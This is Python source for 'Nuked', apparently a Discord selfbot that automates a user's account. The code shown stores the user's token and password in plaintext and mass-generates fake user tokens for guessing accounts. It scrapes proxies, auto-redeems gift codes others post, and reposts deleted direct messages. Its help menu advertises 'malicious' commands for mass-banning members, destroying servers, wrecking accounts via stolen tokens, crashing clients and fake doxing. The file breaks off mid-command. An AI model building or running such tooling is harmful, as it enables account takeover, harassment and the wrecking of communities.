import os
import re
import signal
import sys
from os import system

sys.tracebacklimit = 0

try:
    import ast
    import asyncio
    import base64
    import ctypes
    import datetime
    import json
    import random
    import time
    import webbrowser
    from itertools import cycle
    from os import system
    from threading import Thread
    from urllib.request import urlopen

    import cursor
    import discord
    import numpy
    import proxyscrape
    import pyfiglet
    import requests
    import scprint
    import wikipedia
    import youtube_dl
    from bs4 import BeautifulSoup as bs4
    from colorama import Fore, Style
    from discord.ext import commands
    from faker import Faker
    from pypresence import Presence
    from pythonping import ping as pingip
    from tcp_latency import measure_latency
    from urbandictionary_top import udtop
    from youtube_search import YoutubeSearch

except ImportError as e:
    print('You do not have the required python modules to run Nuked, install them from requirements.txt.')

client = commands.Bot(command_prefix='.', self_bot=True)
client.remove_command('help')

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
def splash():
    clear()
    print(f'''
    		         {Fore.LIGHTBLUE_EX}███╗  ██╗    ██╗   ██╗    ██╗{Fore.LIGHTRED_EX}  ██╗    ███████╗    ██████╗
    			 {Fore.LIGHTBLUE_EX}████╗ ██║    ██║   ██║    ██║{Fore.LIGHTRED_EX} ██╔╝    ██╔════╝    ██╔══██╗
    			 {Fore.LIGHTBLUE_EX}██╔██╗██║    ██║   ██║    ███{Fore.LIGHTRED_EX}██═╝     █████╗      ██║  ██║
    			 {Fore.LIGHTBLUE_EX}██║╚████║    ██║   ██║    ██╔{Fore.LIGHTRED_EX}═██╗     ██╔══╝      ██║  ██║
    			 {Fore.LIGHTBLUE_EX}██║ ╚███║    ╚██████╔╝    ██║{Fore.LIGHTRED_EX} ╚██╗    ███████╗    ██████╔╝
    			 {Fore.LIGHTBLUE_EX}╚═╝  ╚══╝     ╚═════╝     ╚═╝{Fore.LIGHTRED_EX}  ╚═╝    ╚══════╝    ╚═════╝


''')
            
class Nuked:
    version = '4.0'
    def SignalHandler(signal, frame):
        clear()
        print(Style.DIM + 'Logging out of Nuked.' + Style.RESET_ALL)
        time.sleep(1)
        clear()
        exit(0)
        
    def CheckToken(token):
        headers = {'Content-Type': 'application/json', 'authorization': token}
        r = requests.get('https://discordapp.com/api/v6/users/@me/library', headers=headers)
        if r.status_code == 200:
            return
        else:
            os.remove(f'{os.getcwd()}\\config.json')
            clear()
            print(Fore.RED + '[Error]: ' + Fore.RESET + Style.DIM + 'The token is invalid.' + Style.RESET_ALL)
            Nuked.InitialSetup()
            
    def Error(error: str, reason: str):
        raise Exception(f'There was an error with Nuked. Here\'s what we know:\nError: {error}\nReason: {reason}')
    
    def InitialSetup():
        if not os.path.exists('./config.json'):
            with open('./config.json', 'w') as fp:
                print(Fore.LIGHTCYAN_EX + 'Welcome to the initial setup process for the Nuked selfbot.')
                setup_token = input('Enter your Discord token: ')
                setup_password = input('Enter your Discord password (enter \'None\' if you don\'t want to): ')
                if setup_password == '':
                    setup_password = 'None'
                setup_data = {
                    "token": setup_token,
                    "password": setup_password,
                    "richpresence": True,
                    "prefix": ".",
                    "mention_logger": True,
                    "block_ping": True,
                    "disable_eval": True,
                    "slotbotsnipe": True
                }
                json.dump(setup_data, fp, indent=4)
                print('Additional settings can be tweaked in config.json!')
                time.sleep(3)
            clear()
            Fore.RESET
        else:
            pass  
        
    def Presplash():
        clear()
        for letter in "Logging into Nuked":
            scprint.print("                                                      " + letter, color='blue')
            try:
                ctypes.windll.kernel32.SetConsoleTitleW(letter)
            except:
                pass
            time.sleep(0.1)
        clear()

    def Init():
        if config.get('token') == "token here":
            clear()
            raise Nuked.Error(error='Login Error', reason='Can\'t log into Discord without a token. (Did you enter a token in config.json?)')
        elif config.get('password') == "":
            clear()
            raise Nuked.Error(error='Login Error', reason='In config.json, password must have a value.')
        else:
            try:
                Nuked.CheckToken(config.get('token'))
                cursor.hide()
                client.run(config.get('token'), bot=False, reconnect=True)            
            except Exception as error:
                print(f"Error logging into token: {error}")
                input()

# data

if not os.path.exists('./config.json'):
    Nuked.InitialSetup()

with open('config.json') as f:
    config = json.load(f)
    
token = config.get('token')
password = config.get('password')
rich_presence = config.get('richpresence')
message_logger = config.get('mention_logger')
numbers = '1234567890'
mentionblocker = config.get('block_ping')
disable_eval = config.get('disable_eval')
slotbot = config.get('slotbotsnipe')
randomness = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijlkmnopqrstuvwxyz'
randomsymbols = '!@#$%^&*()_+[]'
randomnum = '123456789'
client.msgsniper = True
client.snipe_history_dict = {}
client.sniped_message_dict = {}
client.sniped_edited_message_dict = {}
val = 25
languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]
collector = proxyscrape.create_collector('default', 'http')
collector.refresh_proxies(force=True)

# functions

def tokengener():
    fh = ''.join((random.choices(numbers, k=18)))
    token = base64.b64encode(bytes(fh, 'utf-8')).decode() + '.X' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' + numbers, k=5)) + '.' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_' + numbers, k=27))
    return token

def masstokengen():
    tokenfile = open("tokens.txt", "a")
    for i in range(300):
        fh = ''.join((random.choices(numbers, k=18)))
        tokens = base64.b64encode(bytes(fh, 'utf-8')).decode() + '.X' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' + numbers, k=5)) + '.' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_' + numbers, k=27))
        tokenfile.write(tokens + "\n")

def randaddr():
    fake = Faker()
    return fake.address()

def searchq(link):
    return f"https://google.com/search?q={link}".replace(" ", "+")

def pscrape():
    col = proxyscrape.get_collector('default')
    proxy = col.get_proxy()
    pr = [_proxy for _proxy in proxy]
    return f'Proxy: {pr[0]}:{pr[1]}\nCountry: {pr[3]}\nType: {pr[5]}'

def old_splash():
    print(f'''{Fore.RED}
    			   ███╗  ██╗    ██╗   ██╗    ██╗  ██╗    ███████╗    ██████╗
    			   ████╗ ██║    ██║   ██║    ██║ ██╔╝    ██╔════╝    ██╔══██╗
    			   ██╔██╗██║    ██║   ██║    █████═╝     █████╗      ██║  ██║
    			   ██║╚████║    ██║   ██║    ██╔═██╗     ██╔══╝      ██║  ██║
    			   ██║ ╚███║    ╚██████╔╝    ██║ ╚██╗    ███████╗    ██████╔╝
    			   ╚═╝  ╚══╝     ╚═════╝     ╚═╝  ╚═╝    ╚══════╝    ╚═════╝

                                            {Fore.RESET}{Fore.LIGHTGREEN_EX}Welcome to {Fore.RED}Nuked{Fore.RESET}

                                                {Fore.CYAN}Selfbot Info{Fore.RESET}

                                            {Fore.LIGHTGREEN_EX}Prefix: {Fore.WHITE}{client.command_prefix}{Fore.RESET}
                                            {Fore.LIGHTBLUE_EX}Creator: {Fore.LIGHTCYAN_EX}kylie#1337{Fore.RESET}
                                            {Fore.LIGHTMAGENTA_EX}Help Command: {Fore.LIGHTRED_EX}{client.command_prefix}help{Fore.RESET}
                                            {Fore.LIGHTYELLOW_EX}Nitro Sniper: Active{Fore.RESET}
                                            {Fore.LIGHTCYAN_EX}Mention Logger: {message_logger}{Fore.RESET}
                                            {Fore.LIGHTRED_EX}Mention Blocker: {mentionblocker}{Fore.RESET}

                                                 {Fore.CYAN}User Info{Fore.RESET}

                                            {Fore.YELLOW}ID: {client.user.id}{Fore.RESET}
                                            {Fore.LIGHTBLUE_EX}Display Name: {client.user.name}#{client.user.discriminator}{Fore.RESET}
                                            {Fore.GREEN}Email Verified?: {client.user.verified}
                                            {Fore.LIGHTGREEN_EX}Server Count: {len(client.guilds)}{Fore.RESET}
                                            {Fore.LIGHTMAGENTA_EX}Rich Presence: {rich_presence}{Fore.RESET}
        ''' + Fore.RESET)
    
def proxyscraper():
    proxies = collector.get_proxies()
    with open('proxies.txt', 'w') as prox:
        for proxy in proxies:
            prox.write(f'{proxy[0]}:{proxy[1]}\n')
            
def _gayrate(mention):
    percent = random.randint(0, 100)
    return f'{mention} is {percent}% gay :rainbow_flag:'

def _expose(mention):
    dick = random.randint(0, 25)
    height = random.randint(0, 120)
    hot = random.randint(0, 100)
    gay = random.randint(0, 100)
    ugly = random.randint(0, 100)
    horny = random.randint(0, 100)
    return f'{mention} is {gay}% gay :rainbow_flag:\n{mention} is {hot}% hot :hot_face:\n{mention} is {height} inches tall :night_with_stars:\n{mention} is {ugly}% ugly :face_vomiting:\n{mention}\'s dick is {dick} inches :triangular_ruler:\n{mention} is {horny}% horny :lips:'

# events

@client.event
async def on_relationship_add(friendship):
    print(Fore.CYAN + f"\n[{datetime.datetime.now().strftime('%m/%d/%Y, %H:%M:%S %p')}] {Fore.RESET}A friend was added: {friendship.user.display_name}#{friendship.user.discriminator}.")
    
@client.event
async def on_guild_join(guild):
    print(Fore.CYAN + f"\n[{datetime.datetime.now().strftime('%m/%d/%Y, %H:%M:%S %p')}] {Fore.RESET}A guild was joined: {guild.name}.")
    
@client.event
async def on_guild_remove(guild):
    print(Fore.CYAN + f"\n[{datetime.datetime.now().strftime('%m/%d/%Y, %H:%M:%S %p')}] {Fore.RESET}A guild was removed: {guild.name}.")
    
@client.event
async def on_relationship_remove(friendship):
    print(Fore.CYAN + f"\n[{datetime.datetime.now().strftime('%m/%d/%Y, %H:%M:%S %p')}] {Fore.RESET}A friend was removed: {friendship.user.display_name}#{friendship.user.discriminator}.")
    

@client.event
async def on_connect():
    clear()
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(f'Welcome to Nuked, {client.user.name}#{client.user.discriminator}.')
    except:
        pass
    splash()
    print(Fore.CYAN + f"[{datetime.datetime.now().strftime('%m/%d/%Y, %H:%M:%S %p')}]{Fore.RESET} {client.user.name}#{client.user.discriminator} was logged in." + Fore.RESET)
    
@client.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"{Fore.RED}[ERROR]: {Fore.LIGHTCYAN_EX}It seems you cannot run this command due to missing permissions." + Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Fore.RED}[ERROR]: {Fore.LIGHTGREEN_EX}Missing arguments: {error}" + Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.RED}[ERROR]: {Fore.LIGHTWHITE_EX}Not a valid image" + Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Fore.RED}[ERROR]: {Fore.CYAN}Not Allowed: {error}" + Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(f"{Fore.RED}[ERROR]: {Fore.LIGHTYELLOW_EX}Couldn't send a empty message" + Fore.RESET)
    else:
        print(f"{Fore.RED}[ERROR]: {Fore.LIGHTRED_EX}{error_str}" + Fore.RESET)

@client.event
async def on_message_edit(before, after):
    await client.process_commands(after)
    
@client.event
async def on_message_delete(message):
    if message.author.id == client.user.id:
        return
    if client.msgsniper:
        # if isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel): \\ removed so people cant get you disabled
        if isinstance(message.channel, discord.DMChannel):
            attachments = message.attachments
            if len(attachments) == 0:
                message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
                    message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await message.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
                    message.content) + "\n\n**Attachments:**\n" + links
                await message.channel.send(message_content)
    if len(client.sniped_message_dict) > 1000:
        client.sniped_message_dict.clear()
    if len(client.snipe_history_dict) > 1000:
        client.snipe_history_dict.clear()
    attachments = message.attachments
    if len(attachments) == 0:
        channel_id = message.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        client.sniped_message_dict.update({channel_id: message_content})
        if channel_id in client.snipe_history_dict:
            pre = client.snipe_history_dict[channel_id]
            post = str(message.author) + ": " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
            client.snipe_history_dict.update({channel_id: pre[:-3] + post + "\n```"})
        else:
            post = str(message.author) + ": " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
            client.snipe_history_dict.update({channel_id: "```\n" + post + "\n```"})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = message.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(message.content) + "\n\n**Attachments:**\n" + links
        client.sniped_message_dict.update({channel_id: message_content})



@client.listen('on_message')
async def ifmentioned(message):
    if message_logger:
        if message.author == client.user:
            return
        if client.user.mentioned_in(message):
            print(Fore.CYAN + f"\n[{datetime.datetime.now().strftime('%m/%d/%Y, %H:%M:%S %p')}] {Fore.RESET}User {message.author} mentioned you in {message.guild.name}: {Fore.LIGHTGREEN_EX}{message.content.replace(f'<@{client.user.id}>', f'@{client.user.display_name}#{client.user.discriminator}').replace(f'<@!{client.user.id}>', f'@{client.user.display_name}#{client.user.discriminator}')}{Fore.RESET}")
    else:
        pass
    
@client.listen('on_message')
async def nitrosnipe(message):
    if 'discord.gift/' in message.content:
        start = datetime.datetime.now()
        code = re.search("discord.gift/(.*)", message.content).group(1)
        token = config.get('token')

        headers = {'Authorization': token}
        r = requests.post(
            f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
            headers=headers,
        ).text
        elapsed = f'{datetime.datetime.now() - start}s'



        if len(code) < 16:
            print(Fore.CYAN + f"\n[{datetime.datetime.now().strftime('%m/%d/%Y, %H:%M:%S %p')}] {Fore.RESET}A fake nitro code sent by user {message.author} was sniped: {Fore.RED}{code}{Fore.RESET}.")

        elif 'This gift has been redeemed already.' in r:
            print(Fore.CYAN + f"\n[{datetime.datetime.now().strftime('%m/%d/%Y, %H:%M:%S %p')}] {Fore.RESET}A redeemed nitro code sent by user {message.author} was sniped: {Fore.LIGHTRED_EX}{code}{Fore.RESET}.")
        elif 'subscription_plan' in r:
            print(Fore.CYAN + f"\n[{datetime.datetime.now().strftime('%m/%d/%Y, %H:%M:%S %p')}] {Fore.RESET}A valid nitro code sent by {message.author} was sniped: {Fore.LIGHTGREEN_EX}{code}{Fore.RESET}.")


        elif 'Unknown Gift Code' in r:
            print(Fore.CYAN + f"\n[{datetime.datetime.now().strftime('%m/%d/%Y, %H:%M:%S %p')}] {Fore.RESET}An invalid nitro code sent by {message.author} was sniped: {Style.DIM}{code}{Style.RESET_ALL}.")
    else:
        pass
    
@client.listen('on_message')
async def unpingable(message):
    if mentionblocker:
        if client.user.mention in message.content:
            guild = message.guild
            try:
                await guild.ack()
            except:
                pass
    else:
        pass
    
@client.listen('on_message')
async def slotbotgrab(message):
    if slotbot:
        if message.author.id == 346353957029019648:
            if 'Hurry and pick it up with' in message.content:
                await message.channel.send('~grab')

# selfbot commands

@client.command()
async def help(ctx, c: str=None):
    if not c:
        await ctx.message.delete()
        embed = discord.Embed(title='**Help**', description=f'Welcome to Nuked, {client.user.display_name}#{client.user.discriminator}.\nCommand count: {len(client.commands)}\nCommand prefix: {client.command_prefix}', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed.add_field(name='**Fun Commands**', value=f'{client.command_prefix}help fun', inline=False)
        embed.add_field(name='**NSFW Commands**', value=f'{client.command_prefix}help nsfw', inline=False)
        embed.add_field(name='**Malicious Commands**', value=f'{client.command_prefix}help malicious', inline=False)
        embed.add_field(name='**Utility Commands**', value=f'{client.command_prefix}help util\n{client.command_prefix}help util2', inline=False)
        embed.set_thumbnail(url=client.user.avatar_url)
        embed.set_footer(text='Nuked', icon_url='https://cdn.discordapp.com/attachments/820836670857412710/820946025799745576/avatar.png')
        await ctx.send(embed=embed, delete_after=val)
    elif c.lower() == 'fun':
        await ctx.message.delete()
        embed1 = discord.Embed(title='**Fun Commands**', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed1.add_field(name="**cat**", value="sends a random embedded image of a cat.", inline=False)
        embed1.add_field(name="**fact**", value=f"[fact] sends a random fact about an animal (type {client.command_prefix}fact for facts).", inline=False)
        embed1.add_field(name="**spamreport**", value="[mentioned user] spams chat with a fake reporting user message.", inline=False)
        embed1.add_field(name="**ud**", value="[query] queries urban dictionary for a term.", inline=False)
        embed1.add_field(name="**wiki**", value="[query] queries wikipedia for text and returns a summary of it.", inline=False)
        embed1.add_field(name="**websteal**", value="[http or https url] steal a websites data and dump it into an html file.", inline=False)
        embed1.add_field(name="**gayrate**", value="[mentioned user] gayrates a user.", inline=False)
        embed1.add_field(name="**expose**", value="[mentioned user] exposes a user.", inline=False)
        embed1.add_field(name="**phcomment**", value="[username] [message] sends an image of a custom pornhub comment.", inline=False)
        embed1.add_field(name="**lick**", value="[mentioned user] licks the mentioned user.", inline=False)
        embed1.add_field(name="**kill**", value="[mentioned user] kills the mentioned user.", inline=False)
        embed1.add_field(name="**youtube**", value="[query] queries a message into youtube and returns the results.", inline=False)
        embed1.add_field(name="**cuddle**", value="[mentioned user] cuddles the mentioned user.", inline=False)
        embed1.add_field(name="**bite**", value="[mentioned user] bites the mentioned user.", inline=False)
        embed1.add_field(name="**slap**", value="[mentioned user] slaps a user.", inline=False)
        embed1.add_field(name='**joke**', value='sends a random embedded joke from an API.', inline=False)
        embed1.add_field(name='**tickle**', value='[mentioned user] tickles mentioned user.', inline=False)
        embed1.set_footer(text=f"Command prefix is \"{client.command_prefix}\"")
        await ctx.send(embed=embed1, delete_after=val)
    elif c.lower() == 'fun2':
        embed = discord.Embed(title='**Fun Commands**', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed.add_field(name='**clyde**', value='[message] clydifys a message.', inline=False)
        embed.add_field(name="**rembed**", value="[message] sends a rainbow embed.", inline=False)
        embed.add_field(name="**cuddle**", value="[mentioned user] cuddles the mentioned user.", inline=False)
        embed.add_field(name="**typing**", value="makes it look like you're typing in the channel it is ran in.", inline=False)
        embed.add_field(name="**invisnick**", value="sets your nickname to be invisible.", inline=False)
        embed.add_field(name="**glitchnick**", value="sets your nickname to weird characters.", inline=False)
        embed.add_field(name="**gif**", value="[message] queries a message into giphy and sends the gif.", inline=False)
        embed.add_field(name='**trumptweet**', value='[message] turns a message into a tweet from trump.', inline=False)
        embed.add_field(name='**dox**', value='[mentioned user] fake doxes a user.', inline=False)
        embed.add_field(name="**streaming**", value="[message] sets your discord status to show that your streaming.", inline=False)
        embed.add_field(name="**listening**", value="[message] sets your discord status to show that your listening to something.", inline=False)
        embed.add_field(name="**competing**", value="[message] sets your discord status to show that your competing in something.", inline=False)
        embed.add_field(name="**playing**", value="[messasge] sets your discord status to show that your playing a game.", inline=False)
        embed.add_field(name='**embed**', value='[message] sends a user specified embed.', inline=False)
        embed.add_field(name="**addy**", value="sends a random address.", inline=False)
        embed.add_field(name="**wyr**", value='sends a would you rather question.', inline=False)
        embed.add_field(name="**ascii**", value="[text] sends text to ascii art.", inline=False)
        embed.add_field(name="**tweet**", value="[username] [message] sends a custom tweet image.", inline=False)
        embed.add_field(name="**clown**", value="[user] clowns someone.", inline=False)
        embed.add_field(name="**spam**", value='[amount] spams a message for specified amount of times.', inline=False)
        embed.add_field(name="**kiss**", value="[mentioned user] kisses someone.", inline=False)
        embed.add_field(name="**ghostping**", value="[amount] [mentioned user] ghostpings a mentioned user an amount of times.", inline=False)
        embed.add_field(name="**hug**", value="[mentioned user] hugs someone.", inline=False)
        embed.set_footer(text=f"Command prefix is \"{client.command_prefix}\"")
        await ctx.send(embed=embed, delete_after=val)
    elif c.lower() == 'nsfw':
        await ctx.message.delete()
        embed2 = discord.Embed(title='**NSFW Commands**', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed2.add_field(name="**boobs**", value="sends a random embedded image of boobs.", inline=False)
        embed2.add_field(name="**hentai**", value="sends a random embedded image of hentai.", inline=False)
        embed2.add_field(name="**spank**", value='[mentioned user] spanks a mentioned user.', inline=False)
        embed2.add_field(name="**fuck**", value='[mentioned user] fucks a mentioned user.', inline=False)
        embed2.add_field(name="**pussy**", value="sends a random embedded pussy pic.", inline=False)
        embed2.set_footer(text=f"Command prefix is \"{client.command_prefix}\"")
        await ctx.send(embed=embed2, delete_after=val)
    elif c.lower() == 'malicious':
        await ctx.message.delete()
        embed3 = discord.Embed(title='**Malicious Commands**', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed3.add_field(name="**tokengen**", value="generates a user token.", inline=False)
        embed3.add_field(name="**copy**", value="copies the server that it is ran in.", inline=False)
        embed3.add_field(name="**delhook**", value="[webhook] deletes a webhook.", inline=False)
        embed3.add_field(name="**setnicks**", value="[nickname] sets everyones nickname to user specified name.", inline=False)
        embed3.add_field(name="**hooksend**", value="[webhook] [message] sends something to a webhook.", inline=False)
        embed3.add_field(name="**crash**", value="sends a lot of emojis that can lag a users discord client.", inline=False)
        embed3.add_field(name="**massban**", value="attempts to ban everyone in a guild.", inline=False)
        embed3.add_field(name="**edittag**", value="[message] sends a message and glitches the edited tag.", inline=False)
        embed3.add_field(name="**masskick**", value="attempts to kick everyone in a guild.", inline=False)
        embed3.add_field(name="**revertnicks**", value="reverts everyones nickname back to their name.", inline=False)
        embed3.add_field(name="**tokenfuck**", value="[token] completely fucks a users account via their token.", inline=False)
        embed3.add_field(name="**nuke**", value="bans, mass creates channels, and completely destroys a discord server.", inline=False)
        embed3.add_field(name="**geo**", value="[ip] gets information on an IP address.", inline=False)
        embed3.add_field(name="**mtg**", value="mass generates tokens and dumps them into a text file.", inline=False)
        embed3.set_footer(text=f"Command prefix is \"{client.command_prefix}\"")
        await ctx.send(embed=embed3, delete_after=val)
    elif c.lower() == 'util':
        await ctx.message.delete()
        embed4 = discord.Embed(title='**Utility Commands**', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed4.add_field(name="**ping**", value="[ip/host] pings a ip or host.", inline=False)
        embed4.add_field(name='**hidden**', value='[message] sends your message, but hidden.', inline=False)
        embed4.add_field(name='**strike**', value='[message] sends your message, but striked through.', inline=False)
        embed4.add_field(name="**tokengen**", value="generates a user token.", inline=False)
        embed4.add_field(name="**dlvid**", value="[query] downloads the top youtube video based on a query.", inline=False)
        embed4.add_field(name="**setprefix**", value="[prefix] allows you to change the command prefix.", inline=False)
        embed4.add_field(name="**nmap**", value="[ip/host] portscans an IP address or host if you have nmap installed on your pc.", inline=False)
        embed4.add_field(name='**hspam**', value='spams the chat with a huge blank message.', inline=False)
        embed4.add_field(name='**normalspam**', value='[amount] [message] sends a message for a specified amount of times.', inline=False)
        embed4.add_field(name='**underline**', value='[message] sends your message, but underlined.', inline=False)
        embed4.add_field(name="**id**", value='[mentioned user] sends the ID of the mentioned user.', inline=False)
        embed4.add_field(name="**nitro**", value="sends a random nitro code.", inline=False)
        embed4.add_field(name="**latency**", value="sends client latency.", inline=False)
        embed4.add_field(name="**settings**", value="sends selfbot settings.", inline=False)
        embed4.add_field(name="**bump**", value="bumps server that it is ran in automatically every 7200 seconds.", inline=False)
        embed4.add_field(name="**purge**", value="[amount] purges specified messages sent by you.", inline=False)
        embed4.add_field(name="**fakelink**", value="[link1] [link2] creates a fake link using an exploit which hides links if the message consists of too many |'s.", inline=False)
        embed4.add_field(name='**userinfo**', value='[mentioned user] shows user info on a mentioned person.', inline=False)
        embed4.add_field(name="**webping**", value="[website url] pings a **website.**", inline=False)
        embed4.add_field(name="**paping**", value="[ip] [port] tcp pings an ip.", inline=False)
        embed4.add_field(name="**hookinfo**", value="[webhook] gets webhook info.", inline=False)
        embed4.add_field(name='**password**', value='sends a strong generated password.', inline=False)
        embed4.add_field(name='**hastebin**', value='[content] uploads content to hastebin and returns the link.', inline=False)
        embed4.add_field(name="**download**", value="sends the nuked download link.**", inline=False)
        embed4.add_field(name="**poll**", value="[topic] sends a poll with voting reactions.")
        embed4.add_field(name="**eval**", value="[code/command etc] eval something (dangerous).", inline=False)
        embed4.add_field(name="**logout**", value='logs out of selfbot and closes window.', inline=False)
        embed4.set_footer(text=f"Command prefix is \"{client.command_prefix}\"")
        await ctx.send(embed=embed4, delete_after=val)
    elif c.lower() == 'util2':
        await ctx.message.delete()
        embed5 = discord.Embed(title='**Utility Commands**', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed5.add_field(name="**guildname**", value="[name] sets the servers name.", inline=False)
        embed5.add_field(name="**backup**", value="dumps all friends name, tag and ID into a text file.", inline=False)
        embed5.add_field(name="**allcommands**", value="sends every command in the selfbot as a list.", inline=False)
        embed5.add_field(name="**proxy**", value="sends a random proxy with port.", inline=False)
        embed5.add_field(name="**friend**", value="[mentioned user] sends a friend request to the mentioned user.", inline=False)
        embed5.add_field(name="**unfriend**", value="[mentioned user] unfriends the mentioned user.", inline=False)
        embed5.add_field(name="**hypesquad**", value="[balance | brilliance | bravery | leave] changes your hypesquad.", inline=False)
        embed5.add_field(name='**snipe**', value='snipes a recently deleted message.', inline=False)
        embed5.add_field(name="**ban**", value="[mentioned user] [reason] kicks the user for a reason.", inline=False)
        embed5.add_field(name="**kick**", value="[mentioned user] [reason] bans the user for a reason.", inline=False)
        embed5.add_field(name="**read**", value="marks every guild as read (marks all messages as read).", inline=False)
        embed5.add_field(name="**channels**", value="shows each channel in a guild, including ones not visible by you.", inline=False)
        embed5.add_field(name="**channelinfo**", value="[mentioned channel] gives info on a channel.", inline=False)
        embed5.add_field(name="**block**", value="[mentioned user] blocks the mentioned user.", inline=False)
        embed5.add_field(name="**createdm**", value="[mentioned user] creates a dm with the mentioned user.", inline=False)
        embed5.add_field(name="**send**", value="[mentioned user] [message] sends a dm to the mentioned user.", inline=False)
        embed5.add_field(name="**query**", value="[anything to query into google] queries your message into google.", inline=False)
        embed5.add_field(name="**github**", value="opens a browser to the github of this selfbot.", inline=False)
        embed5.add_field(name='**scrape**', value='scrapes proxies and dumps them into a text file.', inline=False)
        embed5.add_field(name='**getpfp**', value='[mentioned user] gets a mentioned users pfp link and displays it in console.', inline=False)
        embed5.add_field(name='**getallpfp**', value='tries to get everyones pfp link in the server and dumps in in a text file.', inline=False)
        embed5.add_field(name='**guildinfo**', value='gets information for the server and sends it.', inline=False)
        embed5.add_field(name='**oldsplash**', value='resets the selfbots splash screen to the v2 splash.', inline=False)
        embed5.add_field(name='**newsplash**', value='resets the selfbots splash screen to the newest splash.', inline=False)
        embed5.add_field(name='**encode**', value='[string] encodes a string to base64.', inline=False)
        embed5.add_field(name='**decode**', value='[base64 string] decodes a base64 string.', inline=False)
        embed5.add_field(name='**setname**', value='[name] sets your username to whatever is specified.', inline=False)
        embed5.add_field(name='**allservers**', value='displays every server you\'re in inside of the console.', inline=False)
        embed5.add_field(name='**restart**', value='restarts the selfbot.', inline=False)
        embed5.add_field(name='**channel**', value='[channel name] creates a channel with user specified name.', inline=False)
        embed5.add_field(name='**bold**', value='[message] sends your message, but bold.', inline=False)
        embed5.add_field(name='**italics**', value='[message] sends your message, but italicized.', inline=False)
        embed5.set_footer(text=f"Command prefix is \"{client.command_prefix}\"")
        await ctx.send(embed=embed5, delete_after=val)
    else:
        pass
    
@client.command()
async def bump(ctx):
    await ctx.message.delete()
    await ctx.send("Starting..", delete_after=val)
    while True:
        try:
            await ctx.send('!d bump')
            await asyncio.sleep(7200)
        except Exception as e:
            print(f"Couldn't bump. Did the channel get nuked or deleted? Error: {e}")


@client.command()
async def nitro(ctx):
    await ctx.message.delete()
    code = ''.join(random.choices(randomness + randomnum, k=16))
    await ctx.send(f'https://discord.gift/{code}')


@client.command(aliases=['whois'])
async def userinfo(ctx, member: discord.Member = None):
    await ctx.message.delete()
    if not member:
        member = ctx.message.author
    roles = [role for role in member.roles]
    embed = discord.Embed(color=0xFFFAFA, timestamp=ctx.message.created_at, title=f"User Info - {member}")
    embed.set_thumbnail(url=member.avatar_url)

    embed.add_field(name="ID", value=member.id)
    embed.add_field(name="Display Name", value=member.display_name)
    embed.add_field(name="Animated Avatar? ", value=member.is_avatar_animated())
    try:
        embed.add_field(name="Mutual Friends", value=len(await member.mutual_friends()))
    except:
        pass

    embed.add_field(name="Created Account On", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
    embed.add_field(name="Joined Server On", value=member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))

    embed.add_field(name="Roles", value="".join([role.mention for role in roles]))
